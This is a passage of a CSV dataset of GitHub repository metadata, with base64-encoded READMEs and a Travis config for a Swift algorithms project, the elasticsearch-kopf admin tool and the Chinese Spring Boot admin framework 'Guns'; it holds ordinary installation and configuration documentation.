name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
dHVyZXNdKGh0dHBzOi8vZ2l0aHViLmNvbS93YXluZXdiaXNob3AvU3dpZnRT
dHJ1Y3R1cmVzKQoKPiBFeGFtcGxlcyBvZiBjb21tb25seSB1c2VkIGRhdGEg
c3RydWN0dXJlcyBhbmQgYWxnb3JpdGhtcyBpbiBTd2lmdC4gKFN3aWZ0KQoK
KiBbc3dpZnQtYWxnb3JpdGhtLWNsdWJdKGh0dHBzOi8vZ2l0aHViLmNvbS9o
b2xsYW5jZS9zd2lmdC1hbGdvcml0aG0tY2x1YikKCj4gQWxnb3JpdGhtcyBh
bmQgZGF0YSBzdHJ1Y3R1cmVzIGluIFN3aWZ0LCB3aXRoIGV4cGxhbmF0aW9u
cyEKCkNvbnRyaWJ1dG9ycwotLS0tLS0tLS0tLS0KU3BlY2lhbCB0aGFua3Mg
dG8gdGhlc2UgZ3V5cyBmb3IgdGhlaXIgY29udHJpYnV0aW9ucyB0byB0aGUg
cHJvamVjdCdzIGRldmVsb3BtZW50OgotIFtAc3RhbmlzbGF3XShodHRwczov
L2dpdGh1Yi5jb20vc3RhbmlzbGF3KQotIFtAdml0dG9yaW9tIF0oaHR0cHM6
Ly9naXRodWIuY29tL3ZpdHRvcmlvbSkKLSBbQEF1c3RpbkNob3VdKGh0dHBz
Oi8vZ2l0aHViLmNvbS9BdXN0aW5DaG91KQoK
",,"bGFuZ3VhZ2U6IG9iamVjdGl2ZS1jCm9zeF9pbWFnZTogeGNvZGU3LjMKCmJl
Zm9yZV9pbnN0YWxsOgotIHN3X3ZlcnMKLSBjZCBFS0FsZ29yaXRobXNBcHAK
Cmluc3RhbGw6IG1ha2UgaW5zdGFsbAoKc2NyaXB0OiBtYWtlIGNpCgoK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'elasticsearch-kopf',12163044,b'web admin interface for elasticsearch',b'JavaScript',42,2398,,2398,False,b'https://api.github.com/repos/lmenezes/elasticsearch-kopf/forks',"a29wZgo9PT09PT09PT09PT09PT09PT09PT09PQoKa29wZiBpcyBhIHNpbXBs
ZSB3ZWIgYWRtaW5pc3RyYXRpb24gdG9vbCBmb3IgW2VsYXN0aWNzZWFyY2hd
KGh0dHA6Ly9lbGFzdGljLmNvKSB3cml0dGVuIGluIEphdmFTY3JpcHQgKyBB
bmd1bGFySlMgKyBqUXVlcnkgKyBUd2l0dGVyIGJvb3RzdHJhcC4KCkl0IG9m
ZmVycyBhbiBlYXN5IHdheSBvZiBwZXJmb3JtaW5nIGNvbW1vbiB0YXNrcyBv
biBhbiBlbGFzdGljc2VhcmNoIGNsdXN0ZXIuIE5vdCBldmVyeSBzaW5nbGUg
QVBJIGlzIGNvdmVyZWQgYnkgdGhpcyBwbHVnaW4sIGJ1dCBpdCBkb2VzIG9m
ZmVyIGEgUkVTVCBjbGllbnQgd2hpY2ggYWxsb3dzIHlvdSB0byBleHBsb3Jl
IHRoZSBmdWxsIHBvdGVudGlhbCBvZiB0aGUgRWxhc3RpY1NlYXJjaCBBUEku
CgojIyBJbXBvcnRhbnQ6CgpLb3BmIGlzIG5vIGxvbmdlciBtYWludGFpbmVk
LiBBIHJlcGxhY2VtZW50KGNlcmVicm8pIGhhcyBiZWVuIGRldmVsb3BlZCBh
bmQgaXMgY3VycmVudGx5IG1haW50YWluZWQgYXQgW2h0dHBzOi8vZ2l0aHVi
LmNvbS9sbWVuZXplcy9jZXJlYnJvXShodHRwczovL2dpdGh1Yi5jb20vbG1l
bmV6ZXMvY2VyZWJybykuIEF0IHRoaXMgcG9pbnQsIGNlcmVicm8gc2hvdWxk
IGJlIHByZXR0eSBtdWNoIGZlYXR1cmUgZXF1aXZhbGVudCBvZiBrb3BmLCB3
aXRoIGEgZmV3IG5ldyBmZWF0dXJlcyBvbiB0b3AuCgpWZXJzaW9ucwotLS0t
LS0tLS0tLS0KCnwgZWxhc3RpY3NlYXJjaCB2ZXJzaW9uIHwgYnJhbmNoIHwg
bGF0ZXN0IHZlcnNpb24gIHwKfCAtLS0tLS0tLS0tLS0tLS0tLS0tLS0gfCAt
LS0tLS0gfCAtLS0tLS0tLS0tLS0tLS0gfAp8IDAuOTAuWCAgICAgICAgICAg
ICAgICB8IDAuOTAgICB8IHYwLjkwICAgICAgICAgICB8CnwgMS5YICAgICAg
ICAgICAgICAgICAgIHwgMS4wICAgIHwgdjEuNi4xICAgICAgICAgIHwKfCAy
LlggICAgICAgICAgICAgICAgICAgfCAyLjAgICAgfCB2Mi4xLjEgICAgICAg
ICAgfAoKSW5zdGFsbGF0aW9uCi0tLS0tLS0tLS0tLQpZb3UgY2FuIGVpdGhl
ciBpbnN0YWxsIGEgc3BlY2lmaWMgdmVyc2lvbih1c2luZyBpdHMgcmVsZWFz
ZSB0YWcpIG9yIHRoZSBtb3N0IHVwIHRvIGRhdGUgdmVyc2lvbiBmcm9tIGEg
Z2l2ZW4gYnJhbmNoLgoKIyMjI0luc3RhbGxpbmcgb24gYW4gRWxhc3RpY3Nl
YXJjaCBpbnN0YW5jZToKCmBgYGJhc2gKLi9lbGFzdGljc2VhcmNoL2Jpbi9w
bHVnaW4gaW5zdGFsbCBsbWVuZXplcy9lbGFzdGljc2VhcmNoLWtvcGYve2Jy
YW5jaHx2ZXJzaW9ufQpvcGVuIGh0dHA6Ly9sb2NhbGhvc3Q6OTIwMC9fcGx1
Z2luL2tvcGYKYGBgCgojIyMjUnVuIGxvY2FsbHk6CgpgYGBiYXNoCmdpdCBj
bG9uZSBnaXQ6Ly9naXRodWIuY29tL2xtZW5lemVzL2VsYXN0aWNzZWFyY2gt
a29wZi5naXQKY2QgZWxhc3RpY3NlYXJjaC1rb3BmCmdpdCBjaGVja291dCB7
YnJhbmNofHZlcnNpb259Cm9wZW4gX3NpdGUvaW5kZXguaHRtbApgYGAKCnBz
OiBsb2NhbCBleGVjdXRpb24gZG9lc24ndCB3b3JrIHdpdGggQ2hyb21lKGFu
ZCBtYXliZSBvdGhlciBicm93c2VycykuIFNlZSBtb3JlIFtoZXJlXShodHRw
Oi8vZG9jcy5hbmd1bGFyanMub3JnL2FwaS9uZy5kaXJlY3RpdmU6bmdJbmNs
dWRlKS4KCkFsdGVybmF0aXZlbHkgeW91IGNhbiBydW4gaXQgdmlhIGBjb25u
ZWN0YCB3aGljaCBzaG91bGQgc29sdmUgdGhlIGBuZy1pbmNsdWRlYCBpc3N1
ZS4KCmBgYGJhc2gKZ2l0IGNsb25lIGdpdDovL2dpdGh1Yi5jb20vbG1lbmV6
ZXMvZWxhc3RpY3NlYXJjaC1rb3BmLmdpdApjZCBlbGFzdGljc2VhcmNoLWtv
cGYKZ2l0IGNoZWNrb3V0IHticmFuY2h8dmVyc2lvbn0KbnBtIGluc3RhbGwK
Z3J1bnQgc2VydmVyCmBgYAoKQnJvd3NlIHRvIDxodHRwOi8vbG9jYWxob3N0
OjkwMDAvX3NpdGU+LgoKIyMjI0tvcGYgYmVoaW5kIGEgcmV2ZXJzZSBwcm94
eQpFeGFtcGxlIGNvbmZpZ3VyYXRpb24gZm9yIG5naW54OgpgYGAKc2VydmVy
IHsKICBsaXN0ZW4gICAgICAgODA4MDsKICBzZXJ2ZXJfbmFtZSAgbG9jYWxo
b3N0OwoKICBsb2NhdGlvbiB+IF4vZXMuKiQgewogICAgcHJveHlfcGFzcyBo
dHRwOi8vbG9jYWxob3N0OjkyMDA7CiAgICByZXdyaXRlIF4vZXMoLiopIC8k
MSBicmVhazsKICB9CgogIGxvY2F0aW9uIH4gXi9rb3BmLy4qJCB7CiAgICBw
cm94eV9wYXNzIGh0dHA6Ly9sb2NhbGhvc3Q6OTIwMDsKICAgIHJld3JpdGUg
Xi9rb3BmLyguKikgL19wbHVnaW4va29wZi8kMSBicmVhazsKICB9Cn0KYGBg
CkV4YW1wbGUgY29uZmlndXJhdGlvbiBmb3Iga29wZihrb3BmX2V4dGVybmFs
X3NldHRpbmdzLmpzb24pOgpgYGBqc29uCnsKICAiZWxhc3RpY3NlYXJjaF9y
b290X3BhdGgiOiAiL2VzIiwKICAid2l0aF9jcmVkZW50aWFscyI6IGZhbHNl
LAogICJ0aGVtZSI6ICJkYXJrIiwKICAicmVmcmVzaF9yYXRlIjogNTAwMAp9
CmBgYApBY2Nlc3Mga29wZiBhdCBodHRwOi8vbG9jYWxob3N0OjgwODAva29w
Zi8KIyMjI1RyeSBpdCBvbmxpbmU6CmBgYApodHRwOi8vbG1lbmV6ZXMuY29t
L2VsYXN0aWNzZWFyY2gta29wZi8/bG9jYXRpb249aHR0cDovL2xvY2FsaG9z
dDo5MjAwCmBgYAoKIyMjI0Jhc2ljIEhUVFAgQXV0aCBzdXBwb3J0OgpgYGAK
aHR0cDovL2xtZW5lemVzLmNvbS9lbGFzdGljc2VhcmNoLWtvcGYvP2xvY2F0
aW9uPWh0dHA6Ly91c2VyOnB3ZEBsb2NhbGhvc3Q6OTIwMApgYGAKCmlmIHVz
aW5nIGh0dHBzOi8vZ2l0aHViLmNvbS9Bc3F1ZXJhL2VsYXN0aWNzZWFyY2gt
aHR0cC1iYXNpYywgdHJ5OgpgYGAKaHR0cDovL2xtZW5lemVzLmNvbS9lbGFz
dGljc2VhcmNoLWtvcGYvP2xvY2F0aW9uPWh0dHA6Ly91c2VyOnB3ZEBsb2Nh
bGhvc3Q6OTIwMC8vCmBgYApUaGUgcGx1Z2luIG1vZGlmaWVzIHRoZSBiYXNl
IGVsYXN0aWNzZWFyY2ggcmVzcG9uc2UgYW5kIHRoZXJlZm9yZSB0aGlzIHdv
cmthcm91bmQgaXMgbmVlZGVkLgoKU2NyZWVuc2hvdHMKLS0tLS0tLS0tLS0t
CiMjIyNjbHVzdGVyIG92ZXJ2aWV3CiFbY2x1c3RlciBvdmVydmlld10oaW1n
cy9jbHVzdGVyX3ZpZXcucG5nKQoKIyMjI2hlYWRlciByZWZsZWN0cyBjbHVz
dGVyIHN0YXRlCiFbY2x1c3RlciBzdGF0ZV0oaW1ncy9jbHVzdGVyX3N0YXRl
LnBuZykKCiMjIyNSRVNUIENsaWVudAohW3Jlc3QgY2xpZW50XShpbWdzL3Jl
c3RfY2xpZW50LnBuZykKCiMjIyNhbGlhc2VzIG1hbmFnZW1lbnQKIVthbGlh
c2VzIG1hbmFnZW1lbnRdKGltZ3MvYWxpYXNlcy5wbmcpCgojIyMjd2FybWVy
cyBtYW5hZ2VtZW50CiFbd2FybWVycyBtYW5hZ2VtZW50XShpbWdzL3dhcm1l
ci5wbmcpCgojIyMjcGVyY29sYXRvcgohW3BlcmNvbGF0b3JdKGltZ3MvcGVy
Y29sYXRvci5wbmcpCgojIyMjc25hcHNob3RzIG1hbmFnZW1lbnQKIVtzbmFw
c2hvdHMgbWFuYWdlbWVudF0oaW1ncy9zbmFwc2hvdC5wbmcpCgojIyMjYW5h
bHlzaXMgYXBpCiFbYW5hbHlzaXMgYXBpXShpbWdzL2FuYWx5c2lzLnBuZykK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'Guns',96391112,b'Guns\xe5\x9f\xba\xe4\xba\x8eSpringBoot 2\xef\xbc\x8c\xe8\x87\xb4\xe5\x8a\x9b\xe4\xba\x8e\xe5\x81\x9a\xe6\x9b\xb4\xe7\xae\x80\xe6\xb4\x81\xe7\x9a\x84\xe5\x90\x8e\xe5\x8f\xb0\xe7\xae\xa1\xe7\x90\x86\xe7\xb3\xbb\xe7\xbb\x9f\xef\xbc\x8c\xe5\xae\x8c\xe7\xbe\x8e\xe6\x95\xb4\xe5\x90\x88springmvc + shiro + mybatis-plus + beetl!Guns\xe9\xa1\xb9\xe7\x9b\xae\xe4\xbb\xa3\xe7\xa0\x81\xe7\xae\x80\xe6\xb4\x81\xef\xbc\x8c\xe6\xb3\xa8\xe9\x87\x8a\xe4\xb8\xb0\xe5\xaf\x8c\xef\xbc\x8c\xe4\xb8\x8a\xe6\x89\x8b\xe5\xae\xb9\xe6\x98\x93\xef\xbc\x8c\xe5\x90\x8c\xe6\x97\xb6Guns\xe5\x8c\x85\xe5\x90\xab\xe8\xae\xb8\xe5\xa4\x9a\xe5\x9f\xba\xe7\xa1\x80\xe6\xa8\xa1\xe5\x9d\x97(\xe7\x94\xa8\xe6\x88\xb7\xe7\xae\xa1\xe7\x90\x86\xef\xbc\x8c\xe8\xa7\x92\xe8\x89\xb2\xe7\xae\xa1\xe7\x90\x86\xef\xbc\x8c\xe9\x83\xa8\xe9\x97\xa8\xe7\xae\xa1\xe7\x90\x86\xef\xbc\x8c\xe5\xad\x97\xe5\x85\xb8\xe7\xae\xa1\xe7\x90\x86\xe7\xad\x8910\xe4\xb8\xaa\xe6\xa8\xa1\xe5\x9d\x97)\xef\xbc\x8c\xe5\x8f\xaf\xe4\xbb\xa5\xe7\x9b\xb4\xe6\x8e\xa5\xe4\xbd\x9c\xe4\xb8\xba\xe4\xb8\x80\xe4\xb8\xaa\xe5\x90\x8e\xe5\x8f\xb0\xe7\xae\xa1\xe7\x90\x86\xe7\xb3\xbb\xe7\xbb\x9f\xe7\x9a\x84\xe8\x84\x9a\xe6\x89\x8b\xe6\x9e\xb6!',b'Java',30,2398,,2398,False,b'https://api.github.com/repos/stylefeng/Guns/forks',"PHAgYWxpZ249ImNlbnRlciI+CiAgICA8aW1nIHNyYz0iaHR0cHM6Ly9pbWFn
ZXMuZ2l0ZWUuY29tL3VwbG9hZHMvaW1hZ2VzLzIwMTkvMDEwOS8yMTQyMThf
ZDJhYTk0OWJfNTUxMjAzLnBuZyIgd2lkdGg9IjMwMCI+CiAgICA8YnI+ICAg
ICAgCiAgICA8YnI+ICAgICAgCiAgICA8cCBhbGlnbj0iY2VudGVyIj4KICAg
ICAgICBHdW5z5Z+65LqOU3ByaW5nIEJvb3Qy77yM6Ie05Yqb5LqO5YGa5pu0
566A5rSB55qE5ZCO5Y+w566h55CG57O757uf44CC5YyF5ZCr57O757uf566h
55CG77yM5Luj56CB55Sf5oiQ77yM5aSa5pWw5o2u5bqT6YCC6YWN77yMU1NP
5Y2V54K555m75b2V77yM5bel5L2c5rWB77yM55+t5L+h77yM6YKu5Lu25Y+R
6YCB77yMT0F1dGgy55m75b2V77yM5Lu75Yqh6LCD5bqm77yM5oyB57ut6ZuG
5oiQ77yMZG9ja2Vy6YOo572y562J5Yqf44CC5pSv5oyBU3ByaW5nIENsb3Vk
IEFsaWJhYmHlvq7mnI3liqHjgILnpL7ljLrmtLvot4PvvIzniYjmnKzov63k
u6Plv6vvvIzliqDnvqTlhY3otLnmioDmnK/mlK/mjIHjgIIKICAgICAgICA8
YnI+ICAgICAgCiAgICAgICAgPGJyPiAgICAgIAogICAgICAgIDxzcGFuPgog
ICAgICAgICAgICA8c3Bhbj4KICAgICAgICAgICAgICAgIEd1bnPlrpjmlrnk
uqTmtYHnvqTvvJoyNTQ1NTAwODEo5ruhKSAgIDY4NDE2MzY2Myjmu6EpICAg
MjA3NDM0MjYwKOa7oSko5LiJ5Liq576k5bey5ruh77yM5omr5LiL5pa55LqM
57u056CB5Yqg5a6Y5pa55b6u5L+h576kKQogICAgICAgICAgICA8L3NwYW4+
CiAgICAgICAgPC9zcGFuPgogICAgICAgIDxicj4KICAgICAgICA8YnI+CiAg
ICAgICAgPGEgaHJlZj0iaHR0cHM6Ly9lYXN5d2ViLnZpcC8iPgogICAgICAg
ICAgICA8aW1nIHNyYz0iaHR0cHM6Ly9pbWcuc2hpZWxkcy5pby9iYWRnZS9l
YXN5d2ViLTMuMS41LWdyZWVuLnN2ZyIgYWx0PSJib290c3RyYXAiPgogICAg
ICAgIDwvYT4gCiAgICAgICAgPGEgaHJlZj0iaHR0cHM6Ly93d3cubGF5dWku
Y29tIj4KICAgICAgICAgICAgPGltZyBzcmM9Imh0dHBzOi8vaW1nLnNoaWVs
ZHMuaW8vYmFkZ2UvbGF5dWktMi41LjUtYmx1ZS5zdmciIGFsdD0iYm9vdHN0
cmFwIj4KICAgICAgICA8L2E+ICAKICAgICAgICArCiAgICAgICAgPGEgaHJl
Zj0iaHR0cDovL3NwcmluZy5pby9wcm9qZWN0cy9zcHJpbmctYm9vdCI+CiAg
ICAgICAgICAgIDxpbWcgc3JjPSJodHRwczovL2ltZy5zaGllbGRzLmlvL2Jh
ZGdlL3NwcmluZy0tYm9vdC0yLjEuNi1ncmVlbi5zdmciIGFsdD0ic3ByaW5n
LWJvb3QiPgogICAgICAgIDwvYT4KICAgICAgICA8YSBocmVmPSJodHRwOi8v
bXAuYmFvbWlkb3UuY29tIj4KICAgICAgICAgICAgPGltZyBzcmM9Imh0dHBz
Oi8vaW1nLnNoaWVsZHMuaW8vYmFkZ2UvbXliYXRpcy0tcGx1cy0zLjAtYmx1
ZS5zdmciIGFsdD0ibXliYXRpcy1wbHVzIj4KICAgICAgICA8L2E+ICAKICAg
ICAgICA8YSBocmVmPSJodHRwOi8vaWJlZXRsLmNvbS8iPgogICAgICAgICAg
ICA8aW1nIHNyYz0iaHR0cHM6Ly9pbWcuc2hpZWxkcy5pby9iYWRnZS9iZWV0
bC0yLjkuMy15ZWxsb3cuc3ZnIiBhbHQ9ImJlZXRsIj4KICAgICAgICA8L2E+
IAogICAgPC9wPgo8L3A+CgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKIyMjIOWcqOe6v2RlbW8KKiDotKbl
j7flr4bnoIHvvJphZG1pbi8xMTExMTHvvIzlnLDlnYDvvJpodHRwOi8vZGVt
by5zdHlsZWZlbmcuY24KKiDpmL/ph4zkupHlj4zljYHkuIDnibnmg6DvvIwx
QzJHIDg2L+W5tCBb54K55oiR6aKG5Y+WXShodHRwczovL3d3dy5hbGl5dW4u
Y29tLzExMTEvMjAxOS9ncm91cC1idXlpbmctc2hhcmU/cHRDb2RlPUNGQ0Y3
QTQ1QjE4MjI2M0Q0MEExNERBQUIwQjMwRUZENjQ3Qzg4Q0Y4OTZFRjUzNSZ1
c2VyQ29kZT1wNGtxejQ1ZSZzaGFyZV9zb3VyY2U9Y29weV9saW5rKQoKIyMj
IOacgOaWsOWFjei0ueaVmeeoiwpbaHR0cHM6Ly93d3cuYmlsaWJpbGkuY29t
L3ZpZGVvL2F2NTY3MTgyMDddKGh0dHBzOi8vd3d3LmJpbGliaWxpLmNvbS92
aWRlby9hdjU2NzE4MjA3KQoK6YWN5aWX6K++5Lu277yaW2h0dHBzOi8vZ2l0
ZWUuY29tL3N0eWxlZmVuZy9HdW5zLUd1aWRlXShodHRwczovL2dpdGVlLmNv
bS9zdHlsZWZlbmcvR3Vucy1HdWlkZSkKCiMjIyDmiavnoIHlhbPms6jlrpjm
lrnlhazkvJflj7flkozlrpjmlrnlvq7kv6HnvqQKPHRhYmxlPgogICAgPHRy
PgogICAgICAgIDx0ZD7lrpjmlrnlhazkvJflj7c8L3RkPgogICAgICAgIDx0
ZD48aW1nIHNyYz0iaHR0cHM6Ly9pbWFnZXMuZ2l0ZWUuY29tL3VwbG9hZHMv
aW1hZ2VzLzIwMTkvMDQxNS8xMDQ5MTFfOWJjOTI0YTVfNTUxMjAzLnBuZyIg
d2lkdGg9IjEyMCIvPjwvdGQ+CiAgICAgICAgPHRkPuaJq+eggemCgOivt+WF
pee+pDwvdGQ+CiAgICAgICAgPHRkPjxpbWcgc3JjPSJodHRwczovL2ltYWdl
cy5naXRlZS5jb20vdXBsb2Fkcy9pbWFnZXMvMjAxOS8wNDE5LzEwMzYyMl9k
NmU5ZmE1ZF81NTEyMDMucG5nIiB3aWR0aD0iMTIwIi8+PC90ZD4KICAgIDwv
dHI+CjwvdGFibGU+CgojIyMg5pyA5pawNi4w5pu05paw5YaF5a655aaC5LiL
KOabtOaWsOaXpeacnzIwMTkuMTAuMjUpCgoxLiDliY3nq6/moYbmnrbljYfn
uqdlYXN5d2ViIDMuMS4177yMbGF5dWnljYfnuqcyLjUuNeOAggoyLiDkvJjl
jJbmlbTkvZPliY3nq69VSeeVjOmdou+8jOabtOWKoOeugOa0ge+8jOWkp+aw
lOOAggozLiDmir3osaHlh7rkuIDlpZfmnYPpmZDmqKHlnovvvIzliKnnlKjm
jqXlj6Pov5vooYzmnYPpmZDmjqfliLblkozosIPnlKjop4TliJnvvIzmlrnk
vr/lnKjmnYPpmZDmjqfliLbmlrnpnaLov5vooYzmi5PlsZXjgIIKNC4g5pu/
5o2i5o6J5LqG5Lul5b6A55qEU2hpcm9LaXTvvIzph4fnlKhMb2dpbkNvbnRl
eHRIb2xkZXIuZ2V0Q29udGV4dCgpLmdldFVzZXIoKeiOt+WPluW9k+WJjeeZ
u+W9leeUqOaIt+OAggo1LiDmnYPpmZDmoYbmnrbmm7/mjaLkuLpzcHJpbmcg
c2VjdXJpdHkgKyBqd3TvvIzph4fnlKjku6TniYznmbvlvZXmlrnlvI/vvIzm
m7TliqDngbXmtLvlj6/mi5PlsZXvvIzlkIzml7bmlrnkvr/lr7nmjqXlpJrn
s7vnu59TU0/jgIIKNi4g5paw5aKe5bi46YeP5a655Zmo5qih5Z6L77yM5a+5
57O757uf5Y+Y6YeP77yM5bi46YeP77yM5Lul5Y+K55So5oi36Ieq5a6a5LmJ
55qE5LiA5Lqb5Y+C5pWw6L+b6KGM5Zyo57q/57u05oqk77yM5Zyo57q/5Yi3
5paw5Y+C5pWw5YC877yM5peg6ZyA6YeN5ZCv44CCCjcuIOezu+e7n+eahOmq
jOivgeeggeW8gOWFs++8jOmhtumDqOWvvOiIquagj+W8gOWFs++8jOezu+e7
n+m7mOiupOWvhueggeetieWcqOW4uOmHj+WuueWZqOi/m+ihjOe7tOaKpO+8
jOaegeWkp+aWueS+v+S6huezu+e7n+S9v+eUqOOAggo4LiDmiYDmnInpobXp
naLliqDovb3nmoRjc3Plkoxqc+i/m+ihjOeJiOacrOaOp+WItu+8jOW9k+WN
h+e6p+mhueebruaXtu+8jOabtOaWsOWvueW6lOeJiOacrOWPt++8jOWPr+aO
p+WItua1j+iniOWZqOWvuee8k+WtmGpz5ZKMY3Nz55qE5Yi35paw44CCCjku
IOWinuWKoOeUqOaIt+eahOiBjOWKoeeuoeeQhu+8jOWPr+WvueeUqOaIt+i/
m+ihjOiBjOWKoee7keWumuOAggoKIyMjIEd1bnPniYjmnKzor7TmmI4KCnwg
54mI5pys5ZCN56ewIHwg6K+05piOIHwg5Zyw5Z2AIHwKfCA6LS0tOiB8IDot
LS06IHwgOi0tLTogfAp8IEd1bnMgdjYuMCB8IOacgOaWsOW8gOa6kOeJiOac
rO+8jOmHh+eUqGxheXVpIHwgaHR0cHM6Ly9naXRlZS5jb20vc3R5bGVmZW5n
L2d1bnMgfAp8IEd1bnMgdjUuMSB8IEd1bnPnu4/lhbjniYjnmoTmnIDmlrDn
iYjvvIzph4fnlKhib290c3RyYXAgMyB8IGh0dHBzOi8vZ2l0ZWUuY29tL3N0
eWxlZmVuZy9ndW5zL3RyZWUvdjUuMS1maW5hbCB8CgojIyMgR3VucyDkvIHk
uJrniYgKKiDkvIHkuJrnuqfvvIzlip/og73mm7TlvLrlpKfvvIzliJvmlrDk
u6PnoIHnlJ/miJDvvIzpq5jnuqdzc2/vvIzlvq7mnI3liqHvvIzlrrnlmajl
jJbpg6jnvbLnrYnvvIzor6bmg4Xngrnlh7tbaHR0cHM6Ly93d3cuc3R5bGVm
ZW5nLmNuXShodHRwczovL3d3dy5zdHlsZWZlbmcuY24pCiog5Lmw5LyB5Lia
54mI6YCB5pyA5pawR3Vuc+aKgOacr+aWh+aho+WSjOinhumikeaVmeeoi++8
jFvngrnlh7vmn6XnnIvmioDmnK/mlofmoaNdKGh0dHBzOi8vZ2l0ZWUuY29t
L3N0eWxlZmVuZy9ndW5zL3dpa2lzL3BhZ2VzP3RpdGxlPUd1bnMlRTYlOEEl
ODAlRTYlOUMlQUYlRTYlOTYlODclRTYlQTElQTMmcGFyZW50PSnvvIxb54K5
5Ye75p+l55yL6KeG6aKR5pWZ56iLXShodHRwczovL2dpdGVlLmNvbS9zdHls
ZWZlbmcvZ3Vucy93aWtpcy9wYWdlcz90aXRsZT1HdW5zJUU4JUE3JTg2JUU5
JUEyJTkxJUU2JTk1JTk5JUU3JUE4JThCJnBhcmVudD0pCgojIyMg54mI5p2D
5aOw5piOCkd1bnPph4fnlKhMR1BMLTMuMOW8gOa6kOWNj+iurgoKIyMjIEd1
bnPliY3nq6/mqKHmnb8KKiBHdW5z5pyA5paw5peX6Iiw54mI77yM5omA55So
5YmN56uv5qih5p2/5Li6RWFzeVdlYuWQjuWPsOW8gOWPkeahhuaetizlrpjn
vZHlnLDlnYDkuLrvvJpbaHR0cHM6Ly9lYXN5d2ViLnZpcC9dKGh0dHBzOi8v
ZWFzeXdlYi52aXAvKe+8jOS9v+eUqOaXtuW3suW+geaxguS9nOiAheWFgeiu
uOOAggoKIyMjIOeuoeeQhuezu+e7n+WKn+iDvQoxLueUqOaIt+euoeeQhiAy
LuinkuiJsueuoeeQhiAzLumDqOmXqOeuoeeQhiA0LuiPnOWNleeuoeeQhiA1
LuWtl+WFuOeuoeeQhiA2LuS4muWKoeaXpeW/lyA3LueZu+W9leaXpeW/lyA4
